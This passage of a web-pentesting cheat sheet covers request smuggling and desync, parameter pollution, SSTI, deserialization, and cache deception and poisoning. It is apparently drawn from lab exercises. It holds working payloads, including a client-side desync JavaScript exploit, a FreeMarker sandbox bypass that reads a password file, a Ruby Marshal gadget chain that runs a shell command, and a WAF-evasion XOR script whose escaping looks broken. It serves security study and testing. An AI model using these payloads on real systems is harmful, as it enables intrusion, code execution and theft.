- Inject into an arbitrary HTTP/2 header a `Content-Length` header via CRLF injection followed by a `\r\n\r\n` and an incomplete body form field such as `exfiltrate=`
	- During downgrade, the front-end server will append internal headers to this field
- Tune the `Content-Length` value

A **blind request tunnelling** is when the front-end server only returns the number of bytes specified in the `Content-Length` of the main response so that the tunnelled request's response is never returned to the attacker.

It's possible to abuse `HEAD` requests, if supported to force the front-end to over-read the main response, making a blind tunnel not blind.

- Responses to `HEAD` requests often contain a `content-length` header even though they don't have a body of their own. Some front-end servers fail to account for this and attempt to read in the number of bytes specified in the header regardless.

Request tunnelling using `HEAD` method:

- Inject into an arbitrary HTTP/2 header a complete HTTP request via CRLF injection
- Tune the `Content-Length` value

### Client-side Desync Attacks

A **client-side desync (CSD)** is an attack that makes the victim's web browser desynchronize its own connection to the vulnerable website.

#### CL.0

CL.0 is a type of **desync attack**. If the back-end server can be persuaded to assume that each request finishes at the end of the headers (as if the request has `Content-Length: 0`), but the front-end still uses the `Content-Length` header to determine where the request ends, it's possible to exploit this discrepancy for HTTP request smuggling.

- To probe for CL.0 vulnerabilities, first send a request containing another partial request in its body, then send a normal follow-up request. You can then check to see whether the response to the follow-up request was affected by the smuggled prefix.

The backend-server behaviour of not reading a request body is typical for endpoints that aren't expecting `POST` requests, such as static files or server-level redirects.

 For these attacks to work:
 
 - **The target web server must not support HTTP/2.** Client-side desyncs rely on HTTP/1.1 connection reuse, and browsers generally favor HTTP/2 where available.
	 - or the victim will access the site via a forward proxy that only supports HTTP/1.1. 
 - Some of the endpoints on the target web server responds to `POST` requests without reading in the body.
 - The web server allows the browser to reuse the same connection for additional requests.

**Key concept**: the web server responds to a `POST` request without reading its body (eventually containing a smuggled request/prefix), leaving it on the server's TCP/TLS socket after it responds to the initial request, desyncing the connection with the browser when next requests arrive.

Attack stages:

1. The victim visits a web page on an arbitrary domain containing malicious JavaScript.
2. The JavaScript causes the victim's browser to issue a request to the vulnerable website. This contains an attacker-controlled request prefix in its body, much like a normal request smuggling attack.
3. The malicious prefix is left on the server's TCP/TLS socket after it responds to the initial request, desyncing the connection with the browser.
4. The JavaScript then triggers a follow-up request **down the poisoned connection** (if using a different connection, the attack will fail). This is appended to the malicious prefix, eliciting a harmful response from the server.

**Note**: As these attacks don't rely on parsing discrepancies between two servers, this means that even single-server websites may be vulnerable.

To check if the web server is ignoring a `POST` body:

- Send a request in which the specified `Content-Length` is longer than the actual body. If the server responds immediately, it's a potential CSD vector.

Most likely candidates are endpoints that aren't expecting `POST` requests, such as static files or server-level redirects. Alternatively, the same behaviour can be found by triggering a server error.

Javascript exploit code:

```javascript
fetch('https://<target>', {
        method: 'POST',
        body: '<gadget request to smuggle>',
        mode: 'cors', // needed to prevent 302 redirect following
        credentials: 'include',
    }).catch(() => {
        fetch('<request to capture>', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
```

### Pause-based desync attacks

Pause-based desync vulnerabilities can occur when a server times out a request but leaves the connection open for reuse.

- Servers are commonly configured with a read timeout. If they don't receive any more data for a certain amount of time, they treat the request as complete and issue a response, regardless of how many bytes they were told to expect.

#### Server-side pause-based desync

Conditions:

- The front-end server must immediately forward each byte of the request to the back-end rather than waiting until it has received the full request.
- The front-end server must not (or can be encouraged not to) time out requests before the back-end server.
- The back-end server must leave the connection open for reuse following a read timeout.

Flow:

1. The front-end forwards the headers to the back-end, then continues to wait for the remaining bytes promised by the `Content-Length` header.
2. After a while, the back-end times out and sends a response, even though it has only consumed part of the request. At this point, the front-end may or may not read in this response and forward it to us.
3. We finally send the body, which contains a basic request smuggling prefix in this case.
4. The front-end server treats this as a continuation of the initial request and forwards this to the back-end down the same connection.
5. The back-end server has already responded to the initial request, so assumes that these bytes are the start of another request.

Check [this](https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync)for burp usage for testing pause-based desyncs:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1, # allow only one connection
                           requestsPerConnection=500,
                           pipeline=False
                           )

    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000) # pause for 61 seconds after sending bytes until specified marker
    engine.queue(target.req) # Any followup request

def handleResponse(req, interesting):
    table.add(req)
```

### Bypasses

Try adding a `\r` or a ` ` before the headers `content-length` or `transfer-encoding` to trigger possible disambiguity between frontend and backend server.

## Server-Side Parameter Pollution

Server-side parameter pollution occurs when a website embeds user input in a server-side request to an internal API without adequate encoding.

```
Request -> Front-End -> Back-End -> Internal API
```

To test for server-side parameter pollution in the query string, place query syntax characters in your input and observe how the application responds:

 - `#` (**URL-encoded**): attempt to truncate the server-side request.
 - `&` (**URL-encoded**): attempt to inject or override existing parameters in the query string.
 - `=`

Examples:

```
// # truncation
GET /userSearch?name=peter%23foo&back=/home 

// Parameter injection with &
GET /userSearch?name=peter%26foo=xyz&back=/home

// Parameter overriding with &
GET /userSearch?name=peter%26name=carlos&back=/home
```

Note: **the same technique is applicable in POST requests!**

## Template Injection

### Server-Side Template Injection (SSTI)

**Server-side template injection  (SSTI)** vulnerabilities arise when user input is concatenated into templates rather than being passed in as data. 

**SSTI** can occur in two contexts:

- **Plaintext Context**: input is reflected in the resulting HTML generated from the template. Example: `render('Hello ' + input)`
- **Code Context**: input is reflected in a template expression. Example: `engine.render("Hello {{"+input+"}}", data)`


To detect SSTI:

- Try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\` to detect if a template engine is being used. If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way.
- Test if input is reflected in Plaintext Context: try at least these `${7*7}`, `#{7*7}`, `[=3*3]`, `<%= 7 * 7 %>`, `{{7*'7'}}` 
- Test if input is reflected in Code Context: send `7*7` or try breaking the code context, es: `7*7}}<tag>`

Identify the template engine in use:

![ssti-template-engine-identification](../images/web/web-cheatsheet/ssti-template-engine-identification.png)

**Many template engines expose a "self" or "environment" object of some kind, which acts like a namespace containing all objects, methods, and attributes that are supported by the template engine. If such an object exists, you can potentially use it to generate a list of objects that are in scope.**

Useful resources:

- https://portswigger.net/research/server-side-template-injection

### Bypasses

FreeMarker sandbox bypass (path traversal):

```java
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

## Unsafe Deserialization

### Type Juggling

PHP does not require explicit type definition in variable declaration. In this case, the type of a variable is determined by the value it stores, by the use of the loose comparison operator `==`. 

An attacker can abuse this behaviour in order to bypass restrictions or elevate privileges:

```php
"5" == 5 // True

0 == 0.0 // True

5 == "5 and a string" // True for PHP < 8

0 == "String without numbers" // True for PHP < 8
```

Note: from PHP 8.0 some loose comparisons are treated differently: [PHP 8.0 Backward Incompatible Changes](https://www.php.net/manual/en/migration80.incompatible.php)

### Magic Methods

Magic methods are a special subset of methods that you do not have to explicitly invoke. Instead, they are invoked automatically whenever a particular event or scenario occurs.

Some languages have magic methods that are invoked automatically **during** the deserialization process. For example, PHP's `unserialize()` method looks for and invokes an object's `__wakeup()` magic method.
Java deserialization, the same applies to the `ObjectInputStream.readObject()`.

References:

- [PHP Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php)
- [Java Magic Methods](https://dev.to/njnareshjoshi/java-serialization-magic-methods-and-their-uses-with-example-4beo)
- [Python Magic Methods](https://medium.com/@ayeshasidhikha188/a-journey-through-pythons-magic-methods-a35c79b856c7)

### PHAR

When dealing with user input passed to function such as `include()` , `fopen()`or `file_exists()`, **if an arbitrary file upload** is possible, an attacker can upload an evil `PHAR` archive to the server and abuse the implicit metadata deserialization by using the`phar://` stream.

Useful resources:

- [PHAR-JPEG Polyglot](https://github.com/kunte0/phar-jpg-polyglot)
- [PHPGCC](https://github.com/ambionics/phpggc)
### ysoserial

 From Java versions 16 and above, you need to set a series of command-line arguments for Java to run ysoserial:
 
```shell
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED  --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar [payload] '[command]'
```

The `URLDNS` chain triggers a DNS lookup for a supplied URL:

- It does not rely on the target application using a specific vulnerable library and works in **any known Java version.**

`JRMPClient` is another universal chain that you can use for initial detection:

- It causes the server to try establishing a TCP connection to the supplied IP address. This chain may be useful in environments where all outbound traffic is firewalled, including DNS lookups.
### Ruby

Universal RCE Gadget for  Ruby <= 3.0.2:

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

require 'base64'
# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```

## Web Cache

**Non-cacheable** requests are identifiable by the following headers:

- `Cache-Control: no-store`
- `Cache-Control: private` 
- `X-Cache: dynamic`

**Cached** responses are identifiable by the following header: `X-Cache: hit` or `X-Cache-Lookup: hit`

It's important to distinguish **web cache deception** from **web cache poisoning**. While both exploit caching mechanisms, they do so in different ways:

- **Web cache poisoning** manipulates cache keys to inject malicious content into a cached response, which is then served to other users.
- **Web cache deception** exploits cache rules to trick the cache into storing sensitive or private content, which the attacker can then access.

In theory, sites can use the `Vary` response header to specify additional request headers that should be **keyed** when caching a page. in practice, the `Vary` header is only used in a rudimentary way, CDNs like Cloudflare ignore it outright.
 
### Web Cache Deception

In a **web cache deception** attack, an attacker persuades a victim to visit a malicious URL, inducing the victim's browser to make an ambiguous request for sensitive content. The cache misinterprets this as a request for a static resource and stores the response. The attacker can then request the same URL to access the cached response, gaining unauthorized access to private information.

- This attack aims to abuse discrepancies in URL parsing between the application server and the cache server.
- Note that **cache servers often don't use delimiters aside from the question mark** whilst application server can use different delimiters depending on the framework used.
- Many HTTP servers and proxies including Nginx, Node, CloudFlare, CloudFront and Google Cloud decode certain delimiter characters before interpreting the pathname. This process is generally inconsistent between all of them. Moreover, many proxies decode the URL and forward the message with the decoded values.

Steps to perform before executing the Web Cache Deception attack:

1. **Detect origin delimiters**: Try fuzzing delimiters used by the application to parse the URL on **a non-cacheable request**. Es: Springboot uses `;` as delimiter so that `/MyAccount;var1=va` URL is parsed as `/MyAccount` path. Take a look to the referenced article below. **Try URL-encoded and not encoded chars!**
2. **Detect cache delimiters**: Test if a char is the cache delimiter by requesting a R0 request and then appending a random value to the delimiter in a R1 request (`GET /static-endpoint<DELIMITER><Random>`); if responses are equal, the char is the delimiter.
3. **Detect if any decoding**: To test if a character is being decoded, compare a base request with its encoded version in two requests. Es: `/home/index `→ `/%68%6f%6d%65%2f%69%6e%64%65%78`. 
	-  If a non-cacheable requests returns the same response in both requests, the origin server decodes the path before using it.
	- If a cacheable request contains the same cache headers in the response in both requests, it means that the second one was obtained from the proxy, and the key was decoded before being compared.
4. **Detect if any dot-segment normalization**: 
	- To detect normalization in the **origin server**, issue a non-cacheable request (or a request with a **cache buster**) to a known path, then send the same message with a path traversal sequence. If the responses are identical, this means that the path is normalized before it's mapped with a resource.
	- To detect normalization at the **web cache**, repeat the same process but with a cacheable response and compare the X-Cache and Cache-Control headers to verify if the resource was obtained from the cache memory.

It's possible to make the cache server cache private responses by taking advantage of its caching rules:

- Most CDN providers, such as CloudFlare and Akamai, store responses for resources with **static extensions** such as `.js` or .`css`.
	- **Exploit**: Use a character that is used as a delimiter by the origin server but not the cache server to append a static extension to the request. Es: `/myaccount$static.css` where `$` is a delimiter for the origin server but not for the cache and `.css` is treated as static extension by the cache server rules.

- A popular rule implemented in all CDNs allows the user to create rules that match a custom URL path prefix, generally useful for **static directories**:
	- **Exploit 1**: Use a character that is used as a delimiter by the origin server but not the cache server and a path traversal sequence, **if normalized by the cache server**, to make the cache server resolve the path as starting from a static directory (`GET /<Dynamic_Resource><Delimiter><URL Encoded_Dot_Segment><Static_Directory>`). Es: `myaccount$..%2Fstatic/any` 
	- **Exploit 2**: When **the origin server normalizes the path before mapping the endpoint and the cache doesn't normalize the path before evaluating the cache rules**, use this schema instead: `GET /<Static_Directory><Encoded_Dot_Segment><Dynamic_Resource>`. Es: `static/..%2Fmyaccount`

- Some files, like `/robots.txt`, `/favicon.ico`, and `/index.html`, might not be in a static directory or have a static extension but are expected to be immutable in every website (**static files**).
	- **Exploit**: use the same technique as for static directories when there is normalization at the frontend and a delimiter at backend, appending the static file name at the end of the URL (`GET /<Dynamic_Resource><Delimiter><Encoded_Dot_Segment><Static_File>`).


References:

- [Portswigger - Gotta Cache-em All](https://portswigger.net/research/gotta-cache-em-all)
- [Portswigger - Potential Delimiters](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)
### Web Cache Poisoning

Basic methodology:

1. **Identify unkeyed inputs**
2. **Explore input potential**
3. **Inject into cache**

When auditing a live website, accidentally poisoning other visitors is a perpetual hazard. Param Miner mitigates this by adding a cache buster to all outbound requests from Burp.

#### Cache key flaws

Websites generally take most of their input from the URL path and the query string; these inputs have traditionally not been considered suitable for cache poisoning since they're not cached (they would act as **cache busters**). However, many websites and CDNs perform various transformations on keyed components when they are saved in the cache key. This can include:

- Excluding the query string
- Filtering out specific query parameters
- Normalizing input in keyed components

These transformation could lead to **discrepancies between the data that is written to the cache key and the data that is passed into the application code**, even though it all stems from the same input. These cache key flaws can be exploited to poison the cache via inputs that may initially appear unusable.

 The methodology involves the following steps:

1. Identify a suitable **cache oracle**
2. Probe key handling
3. Identify an exploitable gadget


**Cache oracle**: an endpoint that must be cacheable, and that must be some way to tell if you got a cache hit or miss. This could be an explicit HTTP header like `CF-Cache-Status: HIT`, or could be inferred through dynamic content or response timing.

If you can identify that a specific third-party cache is being used, you can also consult the corresponding documentation. This may contain information about how the default cache key is constructed. 

You might even stumble across some handy tips and tricks, such as features that allow you to see the cache key directly.
- For example, Akamai-based websites may support the header `Pragma: akamai-x-get-cache-key`, which you can use to display the cache key in the response headers

**Probe Key Handling**: try *removing specific query parameters*, *removing the entire query string*, *removing the port from the Host header*, and *URL-decoding*. Issue two slightly different requests and observing whether the second one causes a cache hit, indicating that it was issued with the same cache key as the first. If the cache oracle reflects the entire URL and at least one query parameter it's easier to identify key's discrepancies.

When the page does not clearly indicates a cache hit:
- Put cache busters in any headers that can be safely edited without significant side-effects, and might be included in the cache key. (`Add static cachebuster` and `Include cachebusters in headers` options for Param Miner)
- On some targets, you'll find that you can directly delete entries from the target's cache, without authentication, by using the HTTP methods `PURGE` and `FASTLYPURGE`. After issuing the first request containing the transformation to be tested and check if its cached by trying to remove it from the cache (ES: 200 OK when removed (i.e was cached), 404 Not Found when not existing (i.e was not cached)).
- It's very rare for caches to exclude the path from the cache key and, depending on the back-end system, we can take advantage of path normalization to issue requests with different keys that still hit the same endpoint. Here's four different approaches to hitting the path '/' on different systems: `Apache: //` , `Nginx: /%2F`, `PHP: /index.php/xyz` , `.NET: /(A(xyz))/`

Cache key flaws attacks:

- **Unkeyed parameters**: harmful parameters that are excluded from the cache key can be used as vector to cache responses containing harmful payloads.
- **Parameter Cloaking**: when there are discrepancies between the application's parsing and the cache's parsing, this can potentially allow to sneak arbitrary parameters into the application logic by "cloaking" them in an excluded parameter. 
	- **Exploit 1**:  given the following request `GET /?example=123?excluded_param=<payload>`, the cache server parses (wrongly) two parameters (because of the two `?`) and excludes the second one BUT the application parses only one parameter (the one after the first `?`) and considers the rest as part of the value of this parameter. In the example, if parameter `example` is vulnerable,  the payload will be injected and potentially executed in the cached response.
	- **Exploit 2**:  give the following request `GET /?keyed_param=abc&excluded_param=123;keyed_param=payload`, the cache server (correctly) parses two parameters and excludes the second one BUT the application might (eg: if using Ruby on Rails) use bot  `&` and `;`  as parameter separators and consider only the last occurrence of the repeated parameter.
- **Fat GET**: when the cache key is based on the URL, but the server accepts `GET` requests with a body and the value of a parameter is taken from the body instead that from the URL. If the server refuses `GET` requests with a body, it's worth trying override the HTTP method to `POST` with the `X-HTTP-Method-Override` header.
	- **Key Normalization**: see [Key Normalization](#key-normalization). Modern browsers typically URL-encode parameters when sending the request, i.e reflected XSS in query params is typically unexploitable if the server does not URL-decode it. But, if the cache server normalizes the encoded chars when keying a request, an attacker could poison the parameter using the Burp Repeater (no encoding) since, for example, `GET /example?param="><test>` and `GET /example?param=%22%3e%3ctest%3e` will have the same key.
- **Cache Key Injection**: if a user controlled input is used as part of the cache key without proper escaping of the delimiters between the components that form the key, it could be possible for an attacker to craft two different request with the same key, making exploitable client-side vulnerabilities that would otherwise be unexploitable. Firstly try deducting what chars are used as delimiters, then check if there's any escaping for these chars.
- **Internal Cache Poisoning**:some websites implement caching behaviour directly into the application; Instead of caching entire responses, some of these caches break the response down into reusable fragments and cache them each separately. As these cached fragments are intended to be reusable across multiple distinct responses, the concept of a cache key doesn't really apply. Every response that contains a given fragment will reuse the same cached fragment, even if the rest of the response is completely different. Generally, these kind of caches are manipulable with basic web cache poisoning techniques such as manipulating the `Host` header.
	- if the response reflects a mixture of both input from the last request you sent and input from a previous request, this is a key indicator that the cache is storing fragments rather than entire responses.
	- if your input is reflected in responses on multiple distinct pages, in particular on pages in which you never tried to inject your input. 


#### Key normalization
Resolving *dot-segments* and *encodings* in a cache key could allow an attacker to poison arbitrary resources if the origin server is not interpreting the path in the same way.

- **Exploit 1**: The cache key is normalized by the cache server but not by the origin server: `GET /<Backend_Path><Path_Traversal><Poisoned_Path>` (Es: `/<script>X</script>/../../home` is normalized to `/home` by the cache server but interpreted as `/<script>X</script>/` by the origin)
- **Exploit 2**: A character is used as a delimiter by the origin server but not by the cache: `GET /<Backend_Path><Delimiter><Path_Traversal><Poisoned_Path>` (Es: `/payload$/../home` is normalized as `/home` by the cache server but interpreted as `/payload` by the origin )
- Exploit 3: A character is used as a delimiter by the cache server but not by the origin, ONLY WHEN the key is normalized and the path is forwarded with the suffix after the delimiter: `GET /<Poisoned_Path><Front-End_Delimiter><Path_Traversal><Backend_Path>` (Es: `/home#/../payload`)

![cache-server-hashtag-delimiter](../images/web/web-cheatsheet/cache-server-hashtag-delimiter.png)

References:

- [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [Web Cache Entanglement](https://portswigger.net/research/web-cache-entanglement)
## WAF Filters Bypasses

Bypass WAF filters using XOR operations: [XORPass](https://github.com/devploit/XORpass?tab=readme-ov-file).

Take a look at [Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings).

Bypass path-based WAF restriction appending non-printable and extended-ASCII characters that will be ignored by the server:

```
\x09 # Spring
\xA0 # Express
\x1C-1F # Flask
```

## Generic Bypasses

Use XORing to bypass filters; following a useful script:

```python
from string import printable, ascii_letters
import sys
import re

def shellquote(s):
    return "'" + s.replace("\","\\").replace("\"","\\"").replace("'", "\'") + "'"

input_string = sys.argv[1] if len(sys.argv) > 1 else print("No input provided") or exit(1)
banned = sys.argv[2] if len(sys.argv) > 2 else ""
separator = sys.argv[3] if len(sys.argv) > 3 else "+"

charset = printable[:-6]
banned = re.compile(banned)
alphabet = {}

for letter in ascii_letters:
    if not banned.match(letter):
        alphabet[letter] = letter
        continue
    for i in charset:
        if banned.match(i):
            continue
        for j in charset:
            if banned.match(j):
                continue
            tmp = ord(i) ^ ord(j)
            if(chr(tmp) == letter):
                alphabet[letter] = (i, j)
                break
        if letter in alphabet.keys():
            break

output_string = []
for c in input_string:
    if c in alphabet.keys() and type(alphabet[c]) is tuple:
        (s1, s2) = alphabet[c]
        output_string.append(f"({shellquote(s1)} ^ {shellquote(s2)})")
    else:
        output_string.append(f"({shellquote(c)})")

print(separator.join(output_string))
```

## Automatic Testing

Generic `nuclei` scan command:

```shell
nuclei -c <number of concurrent templates> -rl <rate limit/concurrent request> -H 'Cookie:  <cookie>' -u <target> -o nuclei-result.txt -sresp
```

- `-c` : set the max number of concurrent templates to run.
- `-rl`: set the max number of concurrent HTTP requests.
- `-sresp`: save all requests and responses in the output file (`-o`)


Verb Tampering with `feroxbuster`:

```shell
feroxbuster -u <target> -m GET,POST -w /usr/share/dirb/wordlists/small.txt -
-burp-replay --replay-codes 200,201,301,302,400,401

# Silent and without recursion, useful to pipe output to other users
feroxbuster --silent -n -u <target> -m GET,POST -w /usr/share/dirb/wordlists/small.txt --burp-replay --replay-codes 200,201,301,302,400,401
```

**Note**:

- `--burp-replay`: sets replay proxy to localhost:8080 and allows insecure HTTPS
- `--replay-codes`: replays specified status codes to specified replay proxy